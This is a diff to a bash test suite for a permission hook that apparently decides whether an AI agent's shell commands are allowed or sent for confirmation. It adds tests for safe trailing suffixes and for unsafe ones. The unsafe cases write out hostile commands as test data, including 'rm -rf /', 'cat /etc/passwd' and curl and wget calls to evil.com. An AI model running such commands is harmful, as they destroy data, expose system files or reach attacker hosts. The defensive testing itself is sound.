@@ -11,7 +11,8 @@ PASS=0; FAIL=0
 
 test_case() {
   local cmd="$1" expected="$2" desc="$3"
-  local input="{\"tool_input\":{\"command\":\"$cmd\"},\"tool_name\":\"Bash\",\"hook_event_name\":\"PermissionRequest\"}"
+  local escaped_cmd="${cmd//\"/\\\"}"
+  local input="{\"tool_input\":{\"command\":\"$escaped_cmd\"},\"tool_name\":\"Bash\",\"hook_event_name\":\"PermissionRequest\"}"
   local output
   output=$(echo "$input" | bash "$HOOK" 2>/dev/null)
 
@@ -92,7 +93,7 @@ test_case "python3 scripts/foo.py < input.txt" dialog "input redirect"
 test_case "python3 scripts/benign.py <<EOF" dialog "here-document"
 test_case "bash scripts/run.sh <(echo test)" dialog "process substitution <()"
 test_case "bash scripts/run.sh >(cat)" dialog "process substitution >()"
-test_case "bash scripts/run.sh 2>&1" dialog "stderr redirect"
+test_case "bash scripts/run.sh 2>&1" allow "stderr redirect (safe suffix)"
 
 echo ""
 echo "=== Environment Variable Prefix ==="
@@ -266,6 +267,78 @@ test_case_raw '{"tool_input":{"command":""},"tool_name":"Bash","hook_event_name"
 
 # TEST-03: Null byte in JSON (encoded as \u0000)
 test_case_raw '{"tool_input":{"command":"python3 scripts/foo\u0000.py"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "TEST-03: null byte in command (JSON \\u0000)"
+
+echo ""
+echo "=== Safe Trailing Suffixes (Phase 1.5) ==="
+
+# Stderr redirections
+test_case "bash scripts/health_check.sh 2>&1" allow "suffix: 2>&1"
+test_case "python3 scripts/foo.py 2>/dev/null" allow "suffix: 2>/dev/null"
+test_case "bash scripts/run.sh 2>&1" allow "suffix: 2>&1 (bash)"
+
+# Error suppression
+test_case "bash scripts/foo.sh || true" allow "suffix: || true"
+test_case "python3 scripts/bar.py || true" allow "suffix: || true (python3)"
+
+# Echo with literal strings (double-quoted)
+test_case 'bash scripts/foo.sh || echo "failed"' allow 'suffix: || echo "literal"'
+test_case 'bash scripts/foo.sh && echo "success"' allow 'suffix: && echo "literal"'
+test_case 'python3 scripts/bar.py && echo "done"' allow 'suffix: && echo "literal" (python3)'
+
+# Echo with literal strings (single-quoted)
+test_case "bash scripts/foo.sh || echo 'failed'" allow "suffix: || echo 'literal'"
+test_case "bash scripts/foo.sh && echo 'success'" allow "suffix: && echo 'literal'"
+
+# Combinations
+test_case "bash scripts/foo.sh 2>&1 || true" allow "suffix: 2>&1 || true"
+test_case 'bash scripts/foo.sh 2>&1 || echo "failed"' allow 'suffix: 2>&1 || echo "literal"'
+test_case "bash scripts/foo.sh 2>/dev/null || true" allow "suffix: 2>/dev/null || true"
+test_case 'python3 scripts/bar.py 2>&1 && echo "done"' allow 'suffix: 2>&1 && echo "literal"'
+
+# With script arguments
+test_case "bash scripts/validate.sh arg1 arg2 2>&1" allow "suffix: args + 2>&1"
+test_case "bash scripts/validate.sh arg1 || true" allow "suffix: args + || true"
+test_case 'bash scripts/validate.sh arg1 arg2 2>&1 || echo "failed"' allow 'suffix: args + 2>&1 || echo "literal"'
+
+# Direct execution with suffixes
+test_case "./scripts/foo.sh 2>&1" allow "suffix: direct exec + 2>&1"
+test_case "scripts/foo.sh || true" allow "suffix: direct exec + || true"
+test_case 'scripts/foo.sh 2>&1 || echo "error"' allow 'suffix: direct exec + 2>&1 || echo "literal"'
+
+echo ""
+echo "=== Unsafe Suffixes (must reject) ==="
+
+# Dangerous commands after operators
+test_case "bash scripts/foo.sh || rm -rf /" dialog "unsafe: || dangerous command"
+test_case "bash scripts/foo.sh && cat /etc/passwd" dialog "unsafe: && dangerous command"
+test_case "bash scripts/foo.sh || bash -c 'evil'" dialog "unsafe: || arbitrary bash"
+
+# Pipe (not a safe suffix)
+test_case "bash scripts/foo.sh | grep pattern" dialog "unsafe: pipe to grep"
+test_case "bash scripts/foo.sh 2>&1 | tee log.txt" dialog "unsafe: pipe after 2>&1"
+
+# Variable expansion in echo strings
+test_case 'bash scripts/foo.sh || echo "$VAR"' dialog "unsafe: echo with $VAR"
+test_case 'bash scripts/foo.sh && echo "${HOME}"' dialog "unsafe: echo with ${HOME}"
+
+# Command substitution in echo strings
+test_case 'bash scripts/foo.sh || echo "$(whoami)"' dialog "unsafe: echo with $(cmd)"
+test_case 'bash scripts/foo.sh && echo "`id`"' dialog "unsafe: echo with backtick"
+
+# Backtick in echo
+test_case 'bash scripts/foo.sh || echo "`evil`"' dialog "unsafe: backtick in echo"
+
+# Standalone operators (not suffixes — no valid command prefix)
+test_case "|| true" dialog "unsafe: standalone || true"
+test_case "&& echo done" dialog "unsafe: standalone && echo"
+
+# Non-echo command after operators
+test_case "bash scripts/foo.sh || curl http://evil.com" dialog "unsafe: || curl"
+test_case "bash scripts/foo.sh && wget http://evil.com" dialog "unsafe: && wget"
+test_case "bash scripts/foo.sh || python3 -c 'import os'" dialog "unsafe: || python3 -c"
+
+# Multiple dangerous operators
+test_case "bash scripts/foo.sh || true && rm -rf /" dialog "unsafe: safe then dangerous"
 
 echo ""
 echo "=== RESULTS ==="
